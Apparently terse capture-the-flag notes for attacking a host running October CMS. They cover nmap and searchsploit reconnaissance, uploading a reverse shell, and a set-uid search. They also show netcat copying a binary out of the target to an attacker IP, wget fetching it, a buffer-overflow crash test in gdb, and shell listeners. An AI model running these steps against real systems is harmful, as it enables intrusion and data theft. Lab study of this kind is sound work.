nmap -sV -sC -oA nmap &lt;host&gt;

searchsploit october

search vulnerabilities based on the version of the system

* is it outdated?
* what is the version that has vulnerabilities
* download 2 versions of the application \(cms\)

* find the files that have been updated

* compare their hashes

* try to access the README.md to see the changelogs

* remove the unnecessary files

exploit

* upload the reverse-shell script
* when accessed the shell

  * find / -perm -4000 2&gt;/dev/null \(search set-uid files\)
  * 

* get files from the remote server

  * nc -l -p 999 &gt; ovrflw \(local\)
  * nc -w 5 10.10.12.194  999 &lt; /usr/local/bin/ovrflw \(remote\)
  * check for md5

* python -m SimpleHTTPServer

* Run ubuntu with the same version of the target

  * wget 172.16.10.105:8000/ovrflw
  * mv ovrflw Desktop
  * chmod +x ovrflw
  * ``./ovrflw `python -c 'print "A"*200'` #this will trigger a segmentation fault because of buffer overflow``

* `cat ~/.gdbinit` \(this will check if you have `source ~/peda/peda.py`\)

* gdb ./ovrflw

* b main \(breakpoint on main\)

* r \(run\)

* ```r``python -c 'print "A"\*200'\`\`\` \(buffer overflow\)

* c \(continue\)

* you will see an error after `c`

* `python -c 'print "\x41"' (will print A)`

* checksec

* nc -lvnp 888 \(port set on the reverse shell script\)
* stty raw -echo
* nc -lvnp 888
* cd /usr/local/bin
* ldd ovrflw \|grep libc



